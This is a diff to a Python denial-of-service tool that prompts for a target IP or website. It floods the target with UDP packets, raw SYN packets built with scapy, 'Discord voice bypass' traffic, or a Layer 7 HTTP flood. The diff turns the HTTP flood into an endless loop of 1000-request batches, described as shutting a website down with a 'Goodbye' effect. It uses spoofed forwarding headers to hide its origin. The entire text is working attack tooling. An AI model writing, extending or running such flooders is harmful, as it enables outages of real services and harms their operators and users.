@@ -1,7 +1,6 @@
 import socket, threading, random, os, colorama, requests, time, base64, asyncio, aiohttp
 from scapy.all import *
 from colorama import Fore
-
 fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
 global ua
 ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
@@ -33,29 +32,29 @@ YMMMUP^
 print(Fore.LIGHTMAGENTA_EX + logo)
 try:
     category = input(f"\033[1;37mSelect Attack Category (1: Normal DDoS, 2: Discord Voice Bypass, 3: Layer 7 DDoS): ")
-    ip = input(f"\033[1;37mIP Target : ")
-    port = int(input("Port : "))
-    total_requests = int(input("Total Requests (e.g., 1000000 for 1M): "))
+    if category == '3':
+        url = input(f"\033[1;37mWebsite URL (e.g., https://example.com): ")
+        port = int(input(f"Port (default 443, enter 0 for 443): ") or 0)
+    else:
+        ip = input(f"\033[1;37mIP Target : ")
+        port = int(input("Port : "))
     thrs = int(input("Thread : "))
-    concurrency = int(input("Concurrency Level (e.g., 1000 for high RPS): "))
     bost = input("Use Boost ? Y/N : ")
     if os.name == "posix":
         os.system('clear')
     elif os.name == "nt":
         os.system('cls')
     if bost.lower() == 'y':
-        total_requests = total_requests + 500000  # Boost adds 500k requests
+        thrs = thrs + 50  # Boost adds 50 threads
     print(Fore.LIGHTMAGENTA_EX + logo)
     print(Fore.LIGHTRED_EX+"Attacking...")
     print(Fore.LIGHTWHITE_EX+"ATTACK STATUS: ")
     print("╔═════════════════")
-    print(f"║ IP    : {ip}   ")
-    print(f"║ Port  : {port} ")
-    print(f"║ Reqs  : {total_requests}")
-    print(f"║ Thrds : {thrs} ")
-    print(f"║ Conc  : {concurrency} ")
-    print(f"║ Boost : {bost} ")
-    print(f"║ Mode  : {'Normal DDoS' if category == '1' else 'Discord Voice Bypass' if category == '2' else 'Layer 7 DDoS'} ")
+    print(f"║ Target : {url if category == '3' else ip}   ")
+    print(f"║ Port   : {443 if port == 0 and category == '3' else port} ")
+    print(f"║ Thrds  : {thrs} ")
+    print(f"║ Boost  : {bost} ")
+    print(f"║ Mode   : {'Normal DDoS' if category == '1' else 'Discord Voice Bypass' if category == '2' else 'Layer 7 DDoS'} ")
     print("╚═════════════════")
 
     def webrtc_bypass(ip, port, fk, ua_choice):
@@ -80,21 +79,19 @@ try:
         except:
             pass
 
-    async def async_http_flood(session, url, headers, payload):
+    async def async_http_flood(session, url, headers):
         try:
             async with session.get(url, headers=headers) as response:
-                await response.text()
-            async with session.post(url, headers=headers, data=payload) as response:
                 await response.text()
         except:
             pass
 
-    async def layer7_attack(ip, port, fk, ua_choice, concurrency, total_requests):
-        """Optimized async Layer 7 HTTP flood for high RPS."""
-        url = f"http://{ip}:{port}/"
+    async def layer7_attack(url, port, fk, ua_choice):
+        """Continuous Layer 7 HTTP flood to shutdown website with 'Goodbye' effect."""
+        target_url = f"{url}:{port}" if port != 443 else url
         headers = {
             "Host": fk,
-            "User-Agent": ua_choice,
+            "User-Agent": f"{ua_choice} Goodbye-Bot",  # Custom 'goodbye' signature
             "Accept": "*/*",
             "Connection": "keep-alive",
             "X-Forwarded-For": random.choice(fake),
@@ -102,31 +99,22 @@ try:
             "Via": f"2.0 {fk}",
             "X-Requested-With": "XMLHttpRequest"
         }
-        payloads = [
-            f"rand={random.randint(1, 1000000)}&ts={int(time.time())}",
-            f"q={os.urandom(16).hex()}",
-            f"action=submit&value={os.urandom(32).hex()}"
-        ]
-        semaphore = asyncio.Semaphore(concurrency)
-        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=thrs)) as session:
-            tasks = []
-            for _ in range(total_requests // 2):  # Split between GET and POST
-                async def bound_flood():
-                    async with semaphore:
-                        await async_http_flood(session, url, headers, random.choice(payloads))
-                tasks.append(bound_flood())
-            await asyncio.gather(*tasks, return_exceptions=True)
+        while True:  # Run indefinitely until interrupted
+            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                tasks = [async_http_flood(session, target_url, headers) for _ in range(1000)]  # Batch of 1000 requests
+                await asyncio.gather(*tasks, return_exceptions=True)
+                await asyncio.sleep(0.01)  # Control rate to avoid overwhelming local system
 
-    def run_async_layer7(ip, port, fk, ua_choice, concurrency, total_requests):
-        asyncio.run(layer7_attack(ip, port, fk, ua_choice, concurrency, total_requests))
+    def run_async_layer7(url, port, fk, ua_choice):
+        asyncio.run(layer7_attack(url, port, fk, ua_choice))
 
     def c2():
         for fk in fake:
             ua_choice = random.choice(ua)
             try:
                 if category == '3':
-                    # Optimized Layer 7 DDoS with async for high RPS
-                    run_async_layer7(ip, port, fk, ua_choice, concurrency, total_requests)
+                    port = 443 if port == 0 else port
+                    run_async_layer7(url, port, fk, ua_choice)
                 else:
                     # UDP Flood with OVH bypass
                     s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -134,7 +122,7 @@ try:
                     sent = 5000
                     s1.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                     s1.sendto(byte, (ip, port))
-                    for i in range(total_requests):
+                    for i in range(thrs * 1000):  # Scale by threads for request volume
                         s1.sendto(byte, (ip, port))
                         s1.sendto(byte, (ip, port))
                         if category == '2':
@@ -156,7 +144,7 @@ try:
                     tcp = TCP(sport=RandShort(), dport=port, flags="S")
                     raw = Raw(b"X"*random.randint(1000, 60000))  # Fragmented packets
                     p = fuck / tcp / raw
-                    send(p, loop=total_requests, verbose=0)
+                    send(p, loop=thrs * 1000, verbose=0)
                     # Discord Bypass
                     if category == '2':
                         webrtc_bypass(ip, port, fk, ua_choice)
@@ -175,7 +163,7 @@ try:
                     sent = 5000
                     s1.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                     s1.sendto(byte, (ip, port))
-                    for i in range(total_requests):
+                    for i in range(thrs * 1000):
                         s1.sendto(byte, (ip, port))
                         s1.sendto(byte, (ip, port))
                     s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -192,7 +180,7 @@ try:
                     tcp = TCP(sport=RandShort(), dport=port, flags="S")
                     raw = Raw(b"X"*random.randint(1000, 60000))
                     p = fuck / tcp / raw
-                    send(p, loop=total_requests, verbose=0)
+                    send(p, loop=thrs * 1000, verbose=0)
     for i in range(thrs):
         threads = threading.Thread(target=c2)
         threads.start()
